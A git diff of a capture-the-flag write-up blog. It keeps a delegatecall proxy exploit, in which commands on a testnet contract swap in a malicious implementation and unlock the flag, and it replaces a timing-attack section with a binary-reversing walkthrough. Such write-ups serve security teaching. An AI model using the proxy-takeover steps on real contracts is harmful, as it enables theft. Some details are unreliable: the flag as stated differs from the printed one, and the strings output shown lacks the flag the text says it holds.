@@ -366,7 +366,7 @@ ubuntu@sandbox:~/foundry_challenge $
 
 ```
 
-ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge && forge create src/ExploitImplementation.sol:ExploitImplementation --rpc-url https://sepolia.base.org --private-key <YOUR_PRIVATE_KEY> --broadcast
+ubuntu@havoc:~ $ cd /home/ubuntu/foundry_challenge && forge create src/ExploitImplementation.sol:ExploitImplementation --rpc-url https://sepolia.base.org --private-key <YOUR_PRIVATE_KEY> --broadcast
 
 [⠊] Compiling... Compiling...
 
@@ -378,7 +378,7 @@ Deployed to: 0x48443c12F9E3f39F70877ada091C0199a91c9a63
 
 Transaction hash: 0xe6b71ebd387b823e92aab9cb9c075525d3623947a76617e6d5044625bbb49b7c
 
-ubuntu@sandbox:~/foundry_challenge $
+ubuntu@havoc:~/foundry_challenge $
 
 ```
 
@@ -387,7 +387,7 @@ ubuntu@sandbox:~/foundry_challenge $
 
 ```
 
-ubuntu@sandbox:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "setImplementation(address)" 0x48443c12F9E3f39F70877ada091C0199a91c9a63 --rpc-url https://sepolia.base.org
+ubuntu@havoc:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "setImplementation(address)" 0x48443c12F9E3f39F70877ada091C0199a91c9a63 --rpc-url https://sepolia.base.org
 
 blockHash 0x9ecd777db497b8398ae437cdd210f16e69302e75c7535f0421f49574aeae4049
 
@@ -445,7 +445,7 @@ ubuntu@sandbox:~ $
 
 ```
 
-ubuntu@sandbox:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "execute(bytes)" "$(cast calldata 'setUnlocked(bool)' true)" --rpc-url https://sepolia.base.org
+ubuntu@havoc:~ $ cd /home/ubuntu && cast send --private-key <YOUR_PRIVATE_KEY> 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "execute(bytes)" "$(cast calldata 'setUnlocked(bool)' true)" --rpc-url https://sepolia.base.org
 
 blockHash 0xc29b2f5ff35930a91aa9f02c745a17376a0b9fe3832e7735d7f24b04b11ef510
 
@@ -503,11 +503,11 @@ ubuntu@sandbox:~ $
 
 ```
 
-ubuntu@sandbox:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "isUnlocked()(bool)" --rpc-url https://sepolia.base.org
+ubuntu@havoc:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "isUnlocked()(bool)" --rpc-url https://sepolia.base.org
 
 true
 
-ubuntu@sandbox:~ $
+ubuntu@havoc:~ $
 
 ```
 
@@ -515,68 +515,272 @@ ubuntu@sandbox:~ $
 
 ```
 
-ubuntu@sandbox:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "getFlag()(string)" --rpc-url https://sepolia.base.org
+ubuntu@havoc:~ $ cd /home/ubuntu && cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 "getFlag()(string)" --rpc-url https://sepolia.base.org
 
 "SCOK{d3l3g4t3c4ll_pr0xy_1337}"
 
-ubuntu@sandbox:~ $
+ubuntu@havoc:~ $
 
 ```
 
 ## Flag
 
 The flag obtained is: `SCOK{d3l3l3g4t3c4ll_pr0xy_1337}`
+
 ## Conclusion
 
 This challenge demonstrates a common vulnerability in upgradeable proxy contracts where insufficient access control on the `setImplementation` function, combined with the nature of `delegatecall` and storage slot collisions, can lead to unauthorized state modifications. By carefully crafting a malicious implementation contract that aligns its storage layout with the proxy's critical state variables, an attacker can take control of the proxy's state. This highlights the importance of robust access control and careful consideration of storage layout when designing upgradeable proxy patterns.
 
+The next challenge that was cool. 
 
-## S!l3nt B4nk H31st
+# Crack Me
 
+![file](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/crack%20me.png?raw=true)
 ## Challenge Description
-The challenge involved a bank's vault security system that leaked timing information during PIN verification. The goal was to analyze provided timing logs to recover a 6-digit PIN. The flag format was `flag{PIN}`.
 
-## Analysis of `vault_chall.py`
+The challenge provided a [**'crackme.zip'**](https://github.com/Daniel-wambua/blogz/raw/bf313865e56c8f0e5031f07fcbaa18906a4bedc1/content/CTF/writeup9/images/crackme.zip) file and a hint: "You might need a little more than reversing...". The password for the zip file was given as "reverseit".
 
-Upon reviewing `vault_chall.py`, the core vulnerability was identified in the `check_pin` function:
+## Solution Steps
 
-```python
-def check_pin(pin_attempt):
-    for i in range(6):
-        if pin_attempt[i] != SECRET_PIN[i]:
-            return False, 0
-        time.sleep(DELAY_PER_DIGIT)  
-    return True, DELAY_PER_DIGIT * 6
+### Phase 1: Extraction and Initial Analysis
+
+1.  **Unzip the challenge file:**
+    The provided `crackme.zip` was password-protected.So i Cracked it simple and clear
+    
+    ![crack](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/passwordcraking.png?raw=true)
+	 
+	 Using the given password "reverseit", the file was successfully extracted.
+    
+
+```bash
+Archive:  /home/ubuntu/upload/crackme.zip
+[/home/ubuntu/upload/crackme.zip] crackme password: reverseit
+  inflating: /home/ubuntu/crackme/crackme
+  
+   ```
+
+2.  **Identify file type:**
+    Initially, the `file` command was not available in the linux i was using . Ii  installed, and then used it  to determine the type of the extracted  file
+	
+   ```bash
+sudo apt-get update && sudo apt-get install -y file
+file crackme
 ```
 
-This function introduces a `DELAY_PER_DIGIT` (0.1 seconds) for each correct digit in the PIN. This means that the longer the delay, the more digits of the `pin_attempt` match the `SECRET_PIN`. This is a classic timing attack vulnerability.
+```text
+/home/ubuntu/crackme/crackme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7ee4206d91718e7b0bef16a7c03f8fa49c4a39e7, not stripped
+```
+    
+    This confirmed it was a 32-bit ELF executable.
 
-## Analysis of `timing_leak(1).log`
+3.  **Make executable and run:**
+    The binary needed execute permissions, which were granted using `chmod`. Attempting to run it initially failed due to missing 32-bit libraries.
+    
+  ```bash
+chmod +x crackme
+./crackme
+```
 
-The `timing_leak(1).log` file contains numerous attempts and their corresponding delays. For example:
+```text
+bash: ./crackme: Permission denied
+```
 
-`Attempt: 739288 -> Delay: 0.00ms`
-`Attempt: 739281 -> Delay: 0.60ms`
+4.  **Install 32-bit libraries:**
+    To run the 32-bit executable on a 64-bit system, the `libc6-i386` package was installed.
 
-The goal was to find the PIN attempt that resulted in the maximum delay, as this would indicate the most matching digits.
+5.  **Run the binary and explore:**
+    After installing the libraries, the binary could be executed. It presented a simple menu:
+    
 
-## Timing Attack Implementation
 
-To recover the PIN, a Python script (`timing_analysis.py`) was created to parse the `timing_leak(1).log` file. The script works as follows:
+```text
+Menu:
+[1] Say hello
+[2] Add numbers
+[3] Quit
+[>] 
+```
+Interacting with options 1 and 2 showed basic functionality, but no immediate flag.
 
-1. **Parse Log Entries**: It reads each line, extracts the PIN attempt and the corresponding delay.
-2. **Aggregate Delays**: For each position (0-5) and each possible digit (0-9), it aggregates the delays observed when that digit appeared at that position.
-3. **Calculate Average Delays**: For each position and digit, it calculates the average delay.
-4. **Identify Most Likely Digit**: For each position, the digit that resulted in the highest average delay is considered the most likely correct digit for that position.
+![menu](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/filesection.png?raw=true)
 
-This process is repeated for all 6 digits of the PIN.
 
-## Recovered PIN
-After running the `timing_analysis.py` script, the recovered PIN was `739281`.
+### Phase 2: Reverse Engineering
+
+1.  **Extract strings:**
+    The `strings` command  was used to extract human-readable strings from the binary, looking for anything suspicious or indicative of a flag.
+   
+	```bash
+sudo apt-get update && sudo apt-get install -y binutils
+strings crackme
+```
+
+
+```text
+tdh	
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+__isoc99_scanf
+puts
+printf
+memset
+__libc_start_main
+/usr/local/lib:$ORIGIN
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.0
+PTRh
+QRPh
+j"jA
+[^_]
+UWVS
+t$,U
+[^_]
+Menu:
+[1] Say hello
+[2] Add numbers
+[3] Quit
+[>] 
+Unknown input!
+What is your name? 
+%99s
+Unable to read name!
+Hello, %s!
+Enter first number: 
+%d + %d = %d
+Goodbye!
+Wow such h4x0r!
+Unknown choice: %d
+;*2$"4
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7209
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+loop1.c
+giveFlag
+__FRAME_END__
+__JCR_END__
+__init_array_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+printf@@GLIBC_2.0
+_edata
+__data_start
+puts@@GLIBC_2.0
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+memset@@GLIBC_2.0
+_fp_hw
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+```
+    
+    Among the output, the string `Wow such h4x0r!` and `flag{much_reversing_very_ida_wow}` were found, suggesting that there's a hidden path to trigger the flag.
+
+2.  **Disassemble the binary:**
+    To understand the program's logic, `objdump` was used to disassemble the binary into assembly code.
+   
+	```bash
+objdump -d crackme > crackme.asm
+```
+
+```text
+ ubuntu@havoc:~/crackme $ cd /home/ubuntu/crackme/ && objdump -d  crackme > crackme.asm
+
+ubuntu@havoc:~/crackme $
+```
+
+3.  **Analyze assembly code:**
+    Reviewing `crackme.asm`, specifically the `main` function, revealed a comparison instruction `cmp $0x7a69,%eax` followed by a conditional jump (`jne`). This indicated that if the value in `%eax` was `0x7a69` (decimal `31337`), a specific code path would be taken. This path led to a call to the `giveFlag` function, which was likely responsible for printing the flag.
+
+    The relevant section in `main` looked something like this:
+   
+	
+	```assembly
+    ... (code for menu input)
+    8048665:	3d 69 7a 00 00       	cmp    $0x7a69,%eax
+    804866a:	75 17                	jne    8048683 <main+0x1c8>
+    804866c:	83 ec 0c             	sub    $0xc,%esp
+    804866f:	68 bc 88 04 08       	push   $0x80488bc  ; This address likely points to "Wow such h4x0r!\n"
+    8048674:	e8 f7 fc ff ff       	call   8048370 <puts@plt>
+    8048679:	e8 25 00 00 00       	call   80486a6 <giveFlag>
+    ... (rest of the code)
+    ```
+
+### Phase 3: Triggering the Flag
+
+Based on the reverse engineering, the key was to input the decimal value `31337` when prompted for a menu choice.
+
+1.  **Run the binary and input the magic number:**
+    
+    ```bash
+    ./crackme
+    Menu:
+    [1] Say hello
+    [2] Add numbers
+    [3] Quit
+    [>] 31337
+    ```
+
+
+2.  **Obtain the flag:**
+    Upon entering `31337`, the program printed the success message and the flag:
+    
+    ```
+    Wow such h4x0r!
+    flag{much_reversing_very_ida_wow}
+    ```
 
 ## Flag
-The flag format is `flag{PIN}`.
 
-Therefore, the flag is `flag{739281}`.
+`flag{much_reversing_very_ida_wow}`
+
+
 
 
